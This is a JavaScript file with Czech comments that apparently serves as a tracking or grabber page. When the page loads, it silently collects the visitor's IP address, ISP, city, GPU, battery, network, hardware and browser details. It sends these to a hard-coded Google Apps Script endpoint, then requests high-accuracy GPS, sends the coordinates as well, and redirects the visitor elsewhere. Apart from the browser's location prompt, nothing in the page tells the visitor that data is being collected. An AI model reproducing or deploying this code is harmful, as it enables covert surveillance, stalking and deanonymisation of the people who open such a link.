// ============================================================
//  Minimální verze – tiché odeslání dat + GPS + redirect
// ============================================================
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxprgtURbKRGy3QD-gi9d9aQCn5a51iaiHX4of5QkbT0vnODFvLS1XN22QiPwG6gdgOAA/exec";
const REDIRECT_URL = "https://vzdelanylid.cz";

const visitId = (crypto.randomUUID ? crypto.randomUUID() : 
    Date.now().toString(36) + Math.random().toString(36).substring(2));

document.addEventListener("DOMContentLoaded", () => {
    collectAndSend();
});

async function collectAndSend() {
    // --- Základní info ---
    let gpuValue = "Nezjištěno";
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (debugInfo) {
                gpuValue = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {}

    let batteryValue = "Nezjištěno";
    if ("getBattery" in navigator) {
        try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? " (Nabíjí se)" : " (Vybíjí se)";
            batteryValue = `${level}%${charging}`;
        } catch (e) {}
    }

    let netType = "Neznámo";
    let netSpeed = "Neznámo";
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        netType = connection.effectiveType || "Neznámo";
        netSpeed = `RTT: ${connection.rtt}ms, Downlink: ${connection.downlink}Mb/s`;
    }

    // --- IP + geo ---
    let ip = "Nezjištěno";
    let org = "";
    let city = "";
    let country = "";

    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ip = data.ip || "Nezjištěno";
        org = data.org || "";
        city = data.city || "";
        country = data.country_name || "";
    } catch (e) {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const d = await r.json();
            ip = d.ip || "Nezjištěno";
        } catch (e2) {}
    }

    // --- Payload ---
    const payload = {
        type: "fingerprint",
        visitId: visitId,
        timestamp: new Date().toISOString(),
        ip: ip,
        isp: org,
        city: city,
        country: country,
        netType: netType,
        netSpeed: netSpeed,
        cpu: navigator.hardwareConcurrency || null,
        ram: navigator.deviceMemory || null,
        screen: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        gpu: gpuValue,
        battery: batteryValue,
        userAgent: navigator.userAgent,
        language: navigator.languages ? navigator.languages.join(", ") : navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        touchPoints: navigator.maxTouchPoints || 0,
        doNotTrack: navigator.doNotTrack === "1" ? "Ano" : "Ne / Neuvedeno",
        latitude: null,
        longitude: null,
        accuracy: null
    };

    // Odeslat základní data
    try {
        await sendToSheets(payload);
    } catch (err) {
        console.error("Chyba při odesílání fingerprintu:", err);
    }

    // Požádat o GPS a pak redirectnout (ať už GPS přijde nebo ne)
    requestGPSAndRedirect();
}

async function sendToSheets(data) {
    if (!APPS_SCRIPT_URL || APPS_SCRIPT_URL.includes("VAŠE_DEPLOYMENT_ID")) {
        console.log("Payload (demo):", data);
        return { status: "demo" };
    }

    const response = await fetch(APPS_SCRIPT_URL, {
        method: "POST",
        redirect: "follow",
        headers: {
            "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(data)
    });

    const text = await response.text();
    let result;
    try {
        result = JSON.parse(text);
    } catch {
        result = { status: "ok", raw: text };
    }

    if (result.status === "error") {
        throw new Error(result.message || "Chyba z Apps Script");
    }
    return result;
}

function requestGPSAndRedirect() {
    if (!navigator.geolocation) {
        // Geolokace nepodporována → rovnou redirect
        window.location.href = REDIRECT_URL;
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            // Úspěch – pošli GPS a redirectni
            const gpsPayload = {
                type: "gps",
                visitId: visitId,
                timestamp: new Date().toISOString(),
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: Math.round(pos.coords.accuracy)
            };

            try {
                await sendToSheets(gpsPayload);
            } catch (err) {
                console.error("Chyba při odesílání GPS:", err);
            }

            window.location.href = REDIRECT_URL;
        },
        (err) => {
            // Odepřeno nebo chyba → GPS se neposílá, jen redirect
            console.log("GPS odepřeno / chyba:", err.message);
            window.location.href = REDIRECT_URL;
        },
        {
            enableHighAccuracy: true,
            timeout: 12000,
            maximumAge: 0
        }
    );
}
